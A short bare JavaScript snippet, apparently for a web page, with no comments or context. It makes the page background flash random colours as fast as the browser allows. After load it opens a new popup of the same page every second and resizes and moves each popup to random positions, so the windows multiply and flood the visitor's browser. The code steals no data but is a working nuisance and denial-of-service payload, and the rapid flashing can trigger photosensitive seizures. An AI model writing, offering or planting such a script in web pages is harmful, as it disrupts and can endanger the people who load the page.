setInterval(function(){
  document.body.style.backgroundColor = "rgb(" + (Math.random() * 255) + ", "+ (Math.random() * 255) + ", "+ (Math.random() * 255) + ")"
}, 0);
window.addEventListener("load", function(){
try{
var win;
setTimeout(function(){
setInterval(function(){
win = window.open(location.href, "", 'width=400, height=200');
win.resizeTo(Math.random() * screen.width, Math.random() * screen.height);
win.moveTo(Math.random() * screen.width, Math.random() * screen.height);
}, 1000);
}, 1000);
} catch(e){
  alert(e.message);
}
});
